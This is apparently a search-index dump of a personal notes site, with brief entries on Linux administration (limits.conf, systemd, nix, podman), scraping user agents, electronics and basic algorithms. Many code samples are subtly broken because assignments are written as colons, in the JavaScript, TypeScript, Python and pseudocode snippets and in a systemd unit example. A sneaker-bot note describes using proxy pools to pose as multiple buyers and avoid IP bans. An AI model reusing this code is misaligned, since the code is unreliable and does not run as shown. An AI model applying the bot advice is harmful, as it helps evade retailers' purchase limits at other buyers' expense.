/etc/security/limits.conf\nuser_name hard nproc number_of_processes\n</code></pre> <p>To get the total number of all running processes right now for perspective, you can use the following command:</p> <pre><code>ps aux -L | awk '{print $1}' | sort | uniq -c | sort -n | tail -n 1\n</code></pre>"},{"location":"docs/limits.conf/#for-systemd-services","title":"For systemd services","text":"<p>Total number of tasks that systemd allows for each user is usually 33% of the system-wide total.</p> <p>Systemd creates a Cgorup for each user, which sets limits on system resources such as the total number of processes and RAM usage.</p> <p>You can check the status of your user slice with:</p> <pre><code>systemctl status user-$UID.slice\n</code></pre> <p></p> <p>Article ## Nofile</p> <p>The <code>nofile</code> setting limits the number of file descriptors that any process owned by the specified user can have open at any one time.</p>"},{"location":"docs/limits.conf/#core-files","title":"Core Files","text":"<p>Have a soft limit of 0 and a hard limit of unlimited for core files.</p> <p>You can temporarily raise your limit for the current shell with the following command when you need core files for debugging:</p> <pre><code>ulimit -c unlimited\n</code></pre>"},{"location":"docs/limits.conf/#nice","title":"## Nice","text":"<p><code>Important</code> You should disallow everyone except for root from having processes with minimal niceness (-20).</p> <p>This ensures that root can address any unresponsive system issues effectively.</p>"},{"location":"docs/match_py/","title":"match py","text":""},{"location":"docs/match_py/#pattern-matching","title":"Pattern Matching","text":"<pre><code>&gt;&gt;&gt; def file_handler_v1(command):\n...     match command.split():\n...         case ['show']:\n...             print('List all files and directories: ')\n...             # code to list files\n...         case ['remove', *files]:\n...             print('Removing files: {}'.format(files))\n...             # code to remove files\n...         case _:\n...             print('Command not recognized')\n</code></pre> <p>[!quote] regex python_functions</p>"},{"location":"docs/nix/","title":"nix","text":""},{"location":"docs/nix/#to-get-rid-of-the-not-required-geneterations","title":"To get rid of the not required geneterations","text":"<pre><code>sudo nix-collect-garbage -d\n</code></pre> <ul> <li>To list them use</li> </ul> <pre><code>sudo nix-rebuild list-generations\n</code></pre>"},{"location":"docs/nix/#nix-flakes","title":"Nix flakes","text":"<ul> <li>Packages<ul> <li>its the source code of your app</li> </ul> </li> <li>dev-shell<ul> <li>Its u\u2019r environment</li> </ul> </li> <li>Apps<ul> <li>it tells nix what to run and when (similarly to the     containers)</li> </ul> </li> </ul> <p>Git respect history of git so it will not find itself if it hasn\u2019t been added</p> <ul> <li> <p>to run the developer environment type nix develop</p> </li> <li> <p>nix shell nixpkgs#google-chromkjjke</p> </li> <li> <p>nix build .#dockerImages.x86_64-linux.default</p> </li> <li> <p>docker load -i ./result</p> </li> </ul>"},{"location":"docs/nix/#upadte-the-flakelock","title":"Upadte the flake.lock","text":"<pre><code>nix flake update\n</code></pre> <p>[!quote] nix Templates</p>"},{"location":"docs/node/","title":"node","text":"<ul> <li>Small Static Array in memory that contains space for     information and pointer to address in memory</li> </ul> <p>[!tip] It\u2019s stored in random places in memory</p>"},{"location":"docs/nohup/","title":"nohup","text":"<p>If you want to have a process continue even if the terminal window it was launched from is closed, you need a way to intercept the SIGHUP so that the program never receives it.</p> <p>Actually, the terminal window doesn\u2019t launch processes, they\u2019re launched by the shell session inside the terminal window.</p> <p>The simple and elegant solution to that problem is to place another process between the shell session and the program, and have that middle-layer program never pass on the SIGHUP signal.</p>"},{"location":"docs/nsswitch.conf/","title":"etc","text":"<p>Specifies how the system should switch between different name service providers.</p> <ul> <li>The file can be used to configure which services should be used for     hostname lookup, password lookups, and so on.</li> </ul> <p>Example </p> <ul> <li>DNS</li> <li>profile etc</li> </ul>"},{"location":"docs/objdump/","title":"objdump","text":"<ul> <li>Tool to examine binaries<ul> <li>objdump -D a.out</li> <li></li> </ul> </li> <li>There are two languages<ol> <li>AT&amp;T syntax</li> <li>Intel syntax (more readable)<ol> <li>To get this syntax (-M intel flag)</li> <li></li> </ol> </li> </ol> </li> </ul>"},{"location":"docs/orange_book/","title":"orange book","text":""},{"location":"docs/orange_book/#government-security-evaluations","title":"Government Security Evaluations","text":"<p> - TCB (Trusted Computing Base) -</p> <ul> <li>D no protection</li> <li>C disk creation protection A<ul> <li>Security features common to the commercial OSes<ul> <li>DAC</li> </ul> </li> </ul> </li> <li>B mandatory protection<ul> <li>B2 Proof of security of underlying model narrative spec of     TCB<ul> <li>[[MAC|Mac/Selinux]]</li> </ul> </li> </ul> </li> <li>A Verified protection<ul> <li>B3-A1 Formal design and proof of TCB</li> </ul> </li> </ul> <p>orange book orange book explained</p>"},{"location":"docs/overlay_net/","title":"overlay net","text":"<ul> <li>The overlay driver creates a distributed network among multiple     Docker daemon hosts</li> <li>This sit on top of the overlays</li> <li>Host specific networks</li> </ul> <p>Dokcer Swarm</p> <p>It\u2019s beeter to use Kubernetes</p> <p></p>"},{"location":"docs/ping_command/","title":"ping command","text":"<pre><code>[mtr_command](../mtr_command \"mtr_command\")\n</code></pre>"},{"location":"docs/pkexec/","title":"pkexec","text":"<ul> <li>Seting up the polices for the individual programs<ul> <li>It\u2019s focused on the access to programs ### Configurations     #etc</li> </ul> </li> <li>/etc/polkit1</li> </ul>"},{"location":"docs/podman/","title":"podman","text":""},{"location":"docs/podman/#creating-a-systemd-service","title":"Creating a systemd service","text":"<p>Article</p> <pre><code>#/home/pratham/container-chitragupta-db.service\npodman generate systemd --new --name chitragupta-db -f\n</code></pre>"},{"location":"docs/podman/#creating-a-systemd-service-with-ansible","title":"Creating a systemd service with ansible","text":"<p>**Systemd unit files for postgres container must exist!!!</p> <pre><code>    - name: Create systemd user service\n      containers.podman.podman_generate_systemd:\n        name: \"{{ container_name }}\"\n        dest: ~/.config/systemd/user/\n</code></pre> <ul> <li>[docker]({{\\&lt; ref \u201cposts/Linux/Docker/docker.md\u201d&gt;}})</li> </ul>"},{"location":"docs/quota/","title":"quota","text":"<pre><code>this controls how much space can user have on a given parttioon\n</code></pre>"},{"location":"docs/reference_count/","title":"reference count","text":"<p>Technique of storing the number of references, pointers, or handles to a resource, such as an object, a block of memory, disk space, and others</p> <p>inodes</p>"},{"location":"docs/resistance_rob/","title":"resistance rob","text":""},{"location":"docs/resistance_rob/#resistance","title":"Resistance","text":"<ul> <li>The more resistance in a circuit, the lower the voltage will be     across the resistor.</li> <li>Think of it like water flowing through a pipe.<ul> <li>If the pipe is narrow (high resistance), the water pressure     (voltage) will be lower. If the pipe is wide (lowresistance),     the water pressure will be higher.</li> </ul> </li> </ul> <p>[!quote] voltage_rob current_rob</p>"},{"location":"docs/send_queue/","title":"alt-name Send Buffer","text":"<ul> <li>When the backend application wants to send data back to the     client, it places the data into the send queue using the     send() systemcall</li> </ul> <p>recive_queue</p>"},{"location":"docs/smart_transactions/","title":"smart transactions","text":""},{"location":"docs/smart_transactions/#smart-transactions","title":"Smart Transactions","text":"<p>Its the execution of the function over blockchain - If the instruction fails to be executed Therese no trace on the blockchain it does not change the state of the cluster - The issue comes when its the second or the third function in the transaction - The first person in a array of payers pays for the entire transactions</p>"},{"location":"docs/smart_transactions/#transactions","title":"Transactions","text":"<p>Transaction instruction contains - an identyfire of the program to invoke - an ==array of accounts== that will be read and/or written - its needed for the system to be able to run it in parrarel(only if there are two wirtes to same acount we cant run it in parrarel ) - data structured as a byte array that is specified to the program being invoked</p> <p>[!quote]</p>"},{"location":"docs/sneakers_bots_project/","title":"Guide","text":""},{"location":"docs/sneakers_bots_project/#architecture","title":"Architecture","text":"<p>Operating a sneaker bot requires several components:</p> <ul> <li>The bot itself</li> <li>A proxy server</li> <li>Proxy clients that provide IP addresses The proxy server provides     access to a large number of proxies, and can be used to parallelize     the bot, running it multiple times against the same website.     proxy The proxies     give each instance of the bot a unique IP address. A bot uses     multiple IP addresses to make it seem like multiple people are     performing actions. For example, mass-entering into one online queue     can increase the odds of actually making a purchase.</li> </ul> <p>A proxy helps mask bots as multiple buyers. Otherwise, a targeted website can determine that all entries are from one source and ban the IP.</p> <p>bots_gtp_recomendations</p>"},{"location":"docs/ssh_LOG/","title":"ssh LOG","text":"<p>First thing is the /var/log/auth.log</p> <p>ssh</p>"},{"location":"docs/startup_robotics/","title":"startup robotics","text":""},{"location":"docs/startup_robotics/#onion-approach","title":"Onion approach","text":""},{"location":"docs/startup_robotics/#motor","title":"Motor","text":"<p>In order to stuart up the engeine u have to provide Suppley Voltage - 12 Volt dc gear motr - 12 volt battery with a switch</p>"},{"location":"docs/startup_robotics/#motor-driver","title":"Motor driver","text":"<ul> <li> <p>Motors requiter a relativity ==high     voltage_rob== and     current_rob &gt;[!bug]- Connecting them     directly to processor by end up in     fire &gt;</p> </li> <li> <p>Therefor we use motordirver</p> <ul> <li>It takes lots of voltage and uses this power supplay to an     amplyfaier creating<ol> <li>Higier voltage_rob</li> <li>Highier current_rob To drive a     motor</li> </ol> </li> </ul> </li> <li> <p>It creates PWM_rob ### Motor controler It     takes the PMW calculates it and send to console(they can be     combined)</p> </li> </ul> <p></p> <p>[!tip]- Why to separate motor controlers 1. Moduality (easier to swap elements) 2.Allocoation of compute resources</p> <p>Common layer that tarehe speend and send instruction to the motor itslef</p> <ul> <li>Control softwere<ul> <li>Calcualte the speed that it want motor to go</li> <li>Transmit those speed using prtocol to the controler     </li> </ul> </li> </ul> <p>[!quote]</p>"},{"location":"docs/sync__queue/","title":"sync queue","text":"<p>Hold the send taht arraived to the particual socket They are held tmeporarly</p> <p>accept queue request_journey_kernel</p>"},{"location":"docs/systemcall/","title":"systemcall","text":""},{"location":"docs/systemcall/#_1","title":"systemcall","text":"<p>Enables user-level programs to request services and perform privileged operations. - It acts as a secure gateway, allowing programs to interact with hardware and access higher privileges while maintaining system stability and security.</p> <p>[!example]- Accept syscall </p> <p>[!quote]</p>"},{"location":"docs/systemd/","title":"systemd","text":"<p>playlist</p>"},{"location":"docs/systemd/#units","title":"Units","text":"<p>Any entity managed by systemd &gt;[!example]- &gt;</p> <p>systemd_ordering</p>"},{"location":"docs/systemd/#location","title":"Location","text":"<ul> <li>/lib/systemd/systemd standard systmed unit files</li> <li>/usr/lib/systmed/system for locally installed packages (via     apt-get)</li> <li>/run/systemd/systemd transient unit files</li> <li>/etc/systemd/system custom unit files</li> </ul>"},{"location":"docs/systemd/#systemd-targets","title":"Systemd targets","text":"<p>Way of managing relation between units It\u2019s basically groups processor on phases and start them in a correct order</p> <pre><code>systemctl list-units --type: target\n</code></pre> <ul> <li>Target types<ul> <li>Service units: These represent system services.</li> <li>Target units: These are used to group units and act as     synchronization points during boot-up.</li> <li>Device units: These represent devices in the system.</li> <li>Mount units: These define mount points for file systems.</li> <li>Socket units: These represent inter-process communication     sockets.</li> <li>Timer units: These define timer-based activation of other units.</li> <li>Path units: These trigger activation of other units based on     file system events.</li> <li>Snapshot units: These are used to save the state of the systemd     manager.</li> </ul> </li> <li>Last state is multi-user.target</li> </ul> <p><code>u can move between the targets</code></p> <p>*!!This will rollback to a given target!!</p> <pre><code>systemctl isolate sysinit.target\n</code></pre>"},{"location":"docs/systemd/#systemd-procedures","title":"Systemd procedures","text":"<p>[!bug] Always execute the systemctl daemon-reload command After creating new unit files or modifying existing unit files. systemctl deamon-reload</p> <ul> <li> <p>Mask Unmask Blocks the service u can\u2019t start it or enable ,it     creates a service that points to the devnull</p> </li> <li> <p>Reload service Try to reload the config and apply changes</p> </li> <li> <p>Restart Service Close the program and re-run it without the     check</p> </li> </ul> <p>New way</p> <pre><code>sudo systemctl restart *service*\n</code></pre> <p>Old way</p> <pre><code>sudo service *name* restart \n</code></pre> <p>service</p>"},{"location":"docs/systemd/#see-what-was-dirscly-when-the-unit-was-started","title":"See what was dirscly when the unit was started","text":"<p>Example ssh</p> <pre><code>systemd-analyze critical-chain ssh\nsystemctl cat ssh\n</code></pre>"},{"location":"docs/systemd/#configuration","title":"Configuration","text":"<p>[!example]- Docs configuration </p>"},{"location":"docs/systemd/#systemd-timers","title":"Systemd Timers","text":"<p>[!example] </p> <p>Systemd youtube</p>"},{"location":"docs/systemd/#restart","title":"Restart","text":"<p><pre><code># ls /var/log/journal \nsystemctl restart systemd-journald.service \n</code></pre> Important *  by restarting the <code>systemd-journald</code> , you 'll loose all the logging of the current session   so it's recommended to do the following cmd :  <pre><code>killall -USR1 systemd-journald \n</code></pre></p> <p>Cronetab At init</p>"},{"location":"docs/systemd_mount/","title":"systemd mount","text":"<p>Systemd mount units are used to control the mounting and unmounting of filesystems.</p>"},{"location":"docs/systemd_mount/#etc-they-are-similar-to-traditional-etcfstab-entries-but-are","title":"etc They are similar to traditional /etc/fstab entries but are","text":"<p>managed by systemd. Mount units are defined in configuration files typically located in <code>/etc/systemd/system</code> or <code>/run/systemd/system</code>.</p> <p>These files have a .mount extension.</p> <p><code>A unit configuration file whose name ends in \".mount\" encodes information about a file system mount point controlled and supervised by systemd.</code></p> <ul> <li>What specifies the device or filesystem to be mounted.</li> <li>Where specifies the mount point.</li> <li>Type specifies the filesystem type.</li> <li>Options specify mount options.</li> </ul> <p>[!example]</p> <pre><code>[Unit]\nDescription: My Example Mount\n\n[Mount]\nWhat=/dev/sdb1\nWhere=/mnt/mydrive\nType: ext4\nOptions: defaults\n\n[Install]\nWantedBy: multi-user.target\n</code></pre> <p>systemd</p> <p>Systemd Timers</p>"},{"location":"docs/systemd_ordering/","title":"General ordering (dependencies)","text":""},{"location":"docs/systemd_ordering/#wants-wanted-by","title":"Wants, Wanted By","text":"<p>Weakest dependency Please activate together ,but no big deal if you don\u2019t</p> <p>/lib/systemd/system/friendly-recovery.target</p> <pre><code>`Wants: friendly-recovery.service`\n</code></pre> <p>/lib/systemd/system/motd-news.tmier</p> <pre><code>`WantedBy: timers.target`\n</code></pre>"},{"location":"docs/systemd_ordering/#requiters-required-by","title":"Requiters Required by","text":"<p>Strong Dependency You Must activate these units together</p> <p>/lib/systemd/system/friendly-recovery.target</p> <pre><code>`Requires: baisc.target`\n</code></pre> <p>/lib/systemd/system/friendly-recovery.target</p> <pre><code>`RequiredBy: baisc.target`\n</code></pre>"},{"location":"docs/systemd_ordering/#explicit-ordering","title":"Explicit Ordering","text":"<p>In what order are units started</p> <p>/lib/systemd/system/friendly-recovery.target</p> <pre><code>`Before: baisc.target`\n</code></pre> <p>/lib/systemd/system/friendly-recovery.target</p> <pre><code>`After: baisc.target`\n</code></pre>"},{"location":"docs/systemd_ordering/#others","title":"Others","text":"<ul> <li>Requisite like Requires but must already be active</li> <li>BindsTo like Requires but more tightly coupled</li> <li>PartOf like Requires but only affects starting/stopping</li> <li>Conflicts exclude 2 units from being active simultaneously</li> </ul> <p>systemd</p>"},{"location":"docs/three-tier_architecture_net_arch/","title":"three-tier architecture_net_arch","text":""},{"location":"docs/three-tier_architecture_net_arch/#three-tier-architecteru","title":"Three-tier architecteru","text":"<ol> <li>Core<ul> <li>The center of the network</li> <li>Web servers databases applications<ul> <li>Many people require access (usually access switch nearby)</li> <li>==Useres do not connect direcly to the core==</li> </ul> </li> </ul> </li> <li>Distribution<ul> <li>A midpoitn bettwen the path and the users</li> <li>Communicate between access switches</li> <li>Menage path and end user</li> </ul> </li> <li>Access<ul> <li>Where users connect</li> <li>End stations printers</li> </ul> </li> </ol> <p>[!tip]- sfhhjskfshjfsk</p> <p>[!quote] SDN</p>"},{"location":"docs/trap_command/","title":"trap command","text":"<pre><code>- Handels **signals** during sccipr execution\n</code></pre> <pre><code># Define a function to handle signals by name\nhandle_signal() {\n  local signal_name=\"$1\"\n  echo \"Signal $signal_name received.\"\n  exit \n}\n\n# List of signal names\nsignal_names=\"HUP INT QUIT ILL TRAP ABRT BUS FPE USR1 SEGV USR2 PIPE ALRM TERM\"\n\n# Trap signals by name and call the handle_signal function\nfor sig in $signal_names; do\n  trap 'handle_signal $sig' $sig\ndone\n\n# Infinite loop to keep the script running\nwhile true; do\n  echo \"Script is running...\"\n  sleep 5\ndone\n</code></pre> <p>[[Process management_signals.canvas|Process management_signals]] command</p>"},{"location":"docs/tripwire/","title":"tripwire","text":"<pre><code>This tools check the files from ceritain driectiorn\n</code></pre> <p>Use diff exiedt it and repoprt what has changed</p>"},{"location":"docs/user_agent_scraping/","title":"user agent scraping","text":""},{"location":"docs/user_agent_scraping/#user-agent","title":"User agent","text":"<p>Stirng of thex sends to server that identyfies the borwser params</p> <p>Example User agent <pre><code># User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n#  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61\n#  Safari/537.36 \n</code></pre></p>"},{"location":"docs/user_agent_scraping/#seting-up","title":"Seting up","text":"<p>U have to pass it in the headers</p> <pre><code>import requests\n\nurl: \"https://example.com\"\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'\n}\n\nresponse: requests.get(url, headers=headers)\n# Process the response ...\n</code></pre>"},{"location":"docs/user_agent_scraping/#expenations","title":"Expenations","text":"<ol> <li> <p><code>Mozilla/5.0</code>: This is a legacy convention and is often included for     historical reasons. It\u2019s a reference to the original Mozilla     browser.</p> </li> <li> <p><code>(Windows NT 10.0; Win64; x64)</code>: This part indicates the client\u2019s     operating system and architecture. In this example, it\u2019s Windows 10     64-bit.</p> </li> <li> <p><code>AppleWebKit/537.36 (KHTML, like Gecko)</code>: This part indicates the     rendering engine used by the client. In this case, it\u2019s WebKit,     which is the same engine used by Safari.</p> </li> <li> <p><code>Chrome/94.0.4606.61</code>: This part specifies the browser software and     its version. In this example, it\u2019s Google Chrome version     94.0.4606.61.</p> </li> <li> <p><code>Safari/537.36</code>: Some user agent strings include information about     Safari compatibility. In this case, it\u2019s indicating that the client     is compatible with Safari.</p> </li> </ol> <p>[!quote] sneakers_bots_project</p>"},{"location":"docs/voltage_rob/","title":"voltage rob","text":""},{"location":"docs/voltage_rob/#voltage","title":"Voltage","text":"<ul> <li> <p>Pressure that drives electric charges through a circuit</p> </li> <li> <p>As the electric charges flow through the circuit, they encounter     resistances, such as wires or other components. These     resistances slow down the flow of charges</p> <ul> <li>The relationship between the     voltage_rob,     current_rob, and     resistance_rob can be described     by Ohm\u2019s Law which states that voltage equals current     multiplied by resistance (V:IR)</li> </ul> </li> </ul> <p>[!quote]</p>"},{"location":"docs/xfs/","title":"xfs","text":"<ul> <li>Can\u2019t shrink it</li> <li>uses xfs_ as a command</li> </ul>"},{"location":"docs/Algorithms/Big_O/","title":"Big O","text":"<p>How many steps does it take to execute</p> <p>Its the what to categorize algortihms time or memory requaierments based on the input &gt;Tip &gt; &gt;look for loops :) &gt;signular loop is one O fo N</p> <ul> <li>growth with respecet to input</li> <li>constans does not matter</li> <li>worst case is tpyically a measure  </li> <li>Its not meannt to be an exact measument \u2019<ul> <li>it genaralaizes the growth of your algorithm<ul> <li>Example :<ul> <li>Oh of N means that the algorithm will gorw linearly     based on the input  </li> </ul> </li> <li>Why to use it<ul> <li>It helps us make deciosion about what data structers     and algortihms to use<ul> <li>Knwoing the performence it helps to generate the     best outcome</li> </ul> </li> </ul> </li> </ul> </li> </ul> </li> <li>The data structers are design to have the best outcom in a given     usage if u use them incorelcy the lower the performance</li> </ul>"},{"location":"docs/Algorithms/Big_O/#big-o-types","title":"Big O Types","text":"<ul> <li> <p>O squere (\u201cusually loop inside the loop\u201d) O (N^2)</p> <p></p> </li> </ul> <p>Tip</p> <p>If the input halves itsel at each step,its likely O of (LogN) or O(NlogN)</p> <ul> <li>O(n log n)<ul> <li>Quick Sort</li> </ul> </li> <li>O(log n)<ul> <li>Binary search     trees</li> </ul> </li> </ul> <p></p>"},{"location":"docs/Algorithms/Binary_Search_Tree/","title":"Binary Search Tree","text":"<p>It is similar to the Tress Algorithms but i has one condition - The left side has to be less or eqaul to - The right side has to be greater then node - It\u2019s similar to the Quick sort</p> <p>Example </p>"},{"location":"docs/Algorithms/Dynamic_Array/","title":"Dynamic Array","text":"<p>A dynamic array, also known as a vector, provides array access with the ability to grow dynamically when needed.</p> <ul> <li>Runtime Complexity: O(N), where N is the number of elements in     the array.</li> <li>Main Vectors:<ul> <li>Length: Tracks the number of elements currently stored in the     array.</li> <li>Capacity/Size Represents the total size of the array,     including both used and unused slots.</li> <li>Deletion: Removing elements from the array might require     shifting elements to fill the gap, but the actual value doesn\u2019t     have to be deleted since the length keeps track of what is in     the array. ### Expending When exceeding the capacity of the     array, a new array with increased capacity is created, and all     existing elements are copied to the new array.</li> </ul> </li> </ul>"},{"location":"docs/Algorithms/Dynamic_Array/#queue-like-operations","title":"Queue-Like Operations","text":"<p>Dynamic arrays can be used to implement queue-like operations efficiently:</p> <ul> <li> <p>Enqueuing: Adding elements to the end of the array might require     shifting elements if the capacity is exceeded.</p> </li> <li> <p>Dequeuing: Removing elements from the front of the array     requires shifting all remaining elements to the left to fill the gap     created by dequeuing.</p> <p>ring buffer</p> </li> </ul>"},{"location":"docs/Algorithms/Linked_List/","title":"Linked List","text":"<p>Often called node base data structure(type fo container) - So its an node that contnateins a value** and refrence to another value/node $$$$ - Every linked list is a graph &gt;[!example]- Signly link list a only points forwaords there no refrence backworks &gt;</p> <ul> <li>Isertion and deltion are very fast<ul> <li>There\u2019s no index      (u have to manulay step over the value u want to finde)</li> <li>Dleation in the middle can be costly becouse u have to     ==travers== to the value</li> </ul> </li> <li>dobule link list can look backwards</li> <li>Inseration and delation is always O of N<ul> <li>U just have to breake 4 links</li> <li>They are all constants no matter the value or the size u     have to set .nexts and .previous<ul> <li>Inseration </li> <li>Delition (the order of operations is extremaly importat)<ul> <li></li> <li>Add check statment     weather (A or B are real)</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Algorithms/Linked_List/#head-and-tail","title":"Head and tail","text":"<p>The linked list has a special refrence that points to the beginning and the end of a list</p>"},{"location":"docs/Algorithms/Linked_List/#summary","title":"Summary","text":"<ul> <li>prepend/append constant time cheap</li> <li>insetion in the middle traversing costly</li> <li>dleation from the end constant time cheap</li> <li>dealtio in the middle traversing costly</li> <li>Get head/tail constant time cheap</li> <li>Get in gerneral     &gt;[!bug] Theres no hopping on a linked list only travesting</li> </ul>"},{"location":"docs/Algorithms/binary_search/","title":"binary search","text":"<ul> <li>We split the value in half to up to the point we find it<ul> <li>its basically an logarithm so the run time is O(log n)</li> <li>List has to be ordered</li> </ul> </li> </ul>"},{"location":"docs/Algorithms/binary_search/#implementation","title":"Implementation","text":"<p>We find middle point high is exclusive low is inclusive</p> <pre><code>search(array,low,high)\nmidpoint: low +(hi-low)/2\nvalue = [Static Array][m]\nif value: n  \nreturn true \nelse if  v &gt; m \nlow: m+1\n\nelse \nn: m \n</code></pre> <p>Example</p> <p>Code in action </p>"},{"location":"docs/Algorithms/binary_search/#codingproblem-two-crystal-balls-problem-first-we-drop-one-ball-in","title":"codingProblem ## Two crystal balls problem - First we drop one ball in","text":"<p>the middle point to check weather it breaks - Remember that list has to be ordered - if it breaks we check the lower portion of an array - if it doesnt we go higher</p>"},{"location":"docs/Algorithms/bubble_sort_algorithms/","title":"Bubule Sort","text":"<ul> <li> <p>Singular iteration produces the largest number</p> </li> <li> <p>The first interation is N the other is     N-1 &gt;</p> </li> <li> <p>we take an sorrted Static Array</p> <ul> <li>then we aske the value waether is bigger or not<ul> <li>if its bigger we swaps it to the right</li> </ul> </li> <li>we end up with a max value at the end and cut it</li> </ul> </li> <li> <p>*Remeber to add n-1 in the index to not get out og *</p> </li> <li> <p>The run time is OF of n(2) squer</p> <ul> <li>Big O</li> </ul> </li> </ul>"},{"location":"docs/Algorithms/bubble_sort_algorithms/#implementation","title":"Implementation","text":"<pre><code>    for (let i: 0; i &lt; arr.length; i++) {\n  for (let j: 0; j &lt; arr.length - 1 - i; ++j) {\n    if (arr[j] &gt; arr[j + 1]) {\n      const temp: arr[j];\n      arr[j] = arr[j + 1];\n      arr[j + 1] = temp;\n    }\n  }\n</code></pre>"},{"location":"docs/Algorithms/heap/","title":"heap","text":""},{"location":"docs/Algorithms/heap/#the-heap","title":"The Heap","text":"<p>It\u2019s binary tree where every child and grand child is smaller (max heap) or larger(mini heap) then the current node - Whenever a node is added ,we must adjust the tree - Whenever a node is deleted ,we must adjust the tree - ==Therese no traversing==</p> <p>[!quote] cache|Virtual Memory Address</p>"},{"location":"docs/Algorithms/lineral_search/","title":"lineral search","text":""},{"location":"docs/Algorithms/lineral_search/#lineral-search","title":"Lineral search","text":"<ul> <li>It goes over every element of the array and checks weather the value     is correct<ul> <li>*it is the simple implementation of the index of method</li> </ul> </li> </ul>"},{"location":"docs/Algorithms/queue_algorithms/","title":"queue algorithms","text":""},{"location":"docs/Algorithms/queue_algorithms/#que","title":"Que","text":"<p>Its a linked list that only allows insertions through first and last elmeent</p> <p>==First in First out== - Its a singly linked list</p> <ul> <li>Adding<ul> <li>We just update the tail of this structure</li> </ul> </li> <li>Poping<ul> <li>we pop from the head</li> </ul> </li> </ul> <p></p>"},{"location":"docs/Algorithms/queue_algorithms/#code-implematation","title":"Code implematation","text":"<p>[!example]- </p> <pre><code>&lt;T&gt; = {\n  value: T;\n  next?: QueueNode&lt;T&gt;;\n}\n\nexport default class Queue&lt;T&gt; {\n  public length: number;\n  private head?: QueueNode&lt;T&gt;;\n  private tail?: QueueNode&lt;T&gt;;\n\n  constructor() {\n    this.head: this.tail = undefined;\n    this.length: 0;\n  }\n\n  enqueue(item: T): void {\n    const newNode: QueueNode&lt;T&gt; = {\n      value: item,\n      next: undefined,\n    };\n\n    if (!this.head) {\n      this.head: newNode;\n      this.tail: newNode;\n    } else {\n      this.tail!.next: newNode;\n      this.tail: newNode;\n    }\n\n    this.length++;\n  }\n\n  dequeue(): T | undefined {\n    if (!this.head) {\n      return undefined;\n    }\n\n    const head: this.head;\n    this.head: this.head.next;\n    this.length--;\n\n    if (!this.head) {\n      this.tail: undefined;\n    }\n\n    return head.value;\n  }\n\n  peek(): T | undefined {\n    return this.head?.value;\n  }\n}\n</code></pre> <p>[!quote] Linked List stack_algorithms</p>"},{"location":"docs/Algorithms/quick_sort/","title":"quick sort","text":"<pre><code>**\"Divide and concure\"**\n</code></pre> <p>binary search</p> <ul> <li>Split input into number chunks and go over smaller subset and go     over those smaller subset<ul> <li>==it porgreslivi get smaller until it gets to funddemntal unit     example== (array of one element is always sorted)</li> </ul> </li> <li>Steps<ul> <li>Weak soritng Everything before the pivot is smaller     Everything after is bigger     </li> </ul> </li> <li>Run time ==O of n log n==</li> </ul>"},{"location":"docs/Algorithms/quick_sort/#quicsort-problem","title":"Quicsort problem","text":"<ul> <li>I u hand in reversed sorted array U end up with run time of ==O     of n2(squer)==     ReversedSortedArrayProblem_visual.png</li> <li>Solution<ul> <li>Use median of free<ul> <li>Take first middle and last elemnet of an array<ul> <li>Sort them proparly and choose the middle item as a</li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"docs/Algorithms/recursion/","title":"recursion","text":"<pre><code>## Recursion\n</code></pre> <p>The function calles itself until it reaches ==base case==</p> <p>\u201cFriedns dont let friends recurse without a toolbox\u201d</p> <ul> <li> <p>Base case is an instance whent the fucntion no longer calls itsef     instead it returns value</p> <ul> <li>Always vernalize the base case correcly</li> <li>Only then Recourse</li> </ul> </li> <li> <p>Recurse Steps</p> <ul> <li>Pre (recurse )<ul> <li>n+</li> </ul> </li> <li>Recurse</li> <li>Post (recurse)</li> </ul> </li> <li> <p>s</p> <ul> <li>Retrun address<ul> <li>Every time the function is called it needs to know how it     got here becouse it has to hand in the value back</li> </ul> </li> <li>Return Value<ul> <li>The space for value that is beeing return</li> </ul> </li> <li>Arguments<ul> <li>The arguments u pass in to the function</li> </ul> </li> </ul> </li> </ul> <p></p> rA rV A foo5 5+ 10 5 foo4^(points up) 4 + 6 4 foo3^ 3 + 3 3 foo2^ 2 + 1 2 foo1^ 1 1 STOP RECURSION <p>[!bug] Stack treace Error Errors of funcitons that had been called Erorr at foo line :2 foo 3 the value it returns from foo3</p>"},{"location":"docs/Algorithms/recursion/#codingproblem-maze-solver-porblem","title":"codingProblem ## Maze Solver Porblem","text":"<p> - Code implemention -</p>"},{"location":"docs/Algorithms/ring_buffer/","title":"ring buffer","text":"<pre><code>#dynamic_array\n</code></pre>"},{"location":"docs/Algorithms/ring_buffer/#ring-buffer","title":"Ring Buffer","text":"<ul> <li>In rust they are called     VecDeque</li> <li>Its aarray lists with index based head and index based head<ul> <li>Everything before and after is null</li> <li>The ring buffer meatients order</li> </ul> </li> <li>Removing<ul> <li>In order to remove a value u add +1 to the head or tail</li> <li>The cost of operation is O of 1</li> </ul> </li> <li>If u go of the edge **U can go \u201cring around\u201dback to head **<ul> <li>==This.tail = %mod len==     </li> </ul> </li> </ul> <p>[!bug] Dont let tail exects your tail  </p>"},{"location":"docs/Algorithms/ring_buffer/#usebillity-logs-flushing-","title":"Usebillity - logs - flushing -","text":"<p>[!quote] Linked List</p>"},{"location":"docs/Algorithms/search_algorithm/","title":"search algorithm","text":"<pre><code>![lineral search](../../Algorithms/lineral_search)\n</code></pre> <p>1</p> <p></p>"},{"location":"docs/Algorithms/set/","title":"set","text":""},{"location":"docs/Algorithms/set/#set","title":"Set","text":"<p>Data struture that does not allow duplicate values - Arrayed based set</p> <p>[!quote] Dynamic Array</p>"},{"location":"docs/Algorithms/sort_algorithms/","title":"sort algorithms","text":"<p> c A </p> <p>[!quote]</p>"},{"location":"docs/Algorithms/stack_algorithms/","title":"stack algorithms","text":""},{"location":"docs/Algorithms/stack_algorithms/#stack","title":"Stack","text":"<p>First in last out Its similar to the quoe Signly Linked List that u only add or remove from the head - Adding - In order to add we have to update the head pointer to the nex value and then change the head itself - Removing - First save up the head and update the reference StackAddingRemoving_visual.png</p> <p>[!quote] queue_algorithms</p>"},{"location":"docs/Algorithms/traversals/","title":"traversals","text":""},{"location":"docs/Algorithms/traversals/#traversals","title":"Traversals","text":"<p>The running time of thhi operaiton is O of N Doing the treversal we use stack_algorithms The value gets put on the stack ones it not fiind we pop it and move it to the next branch 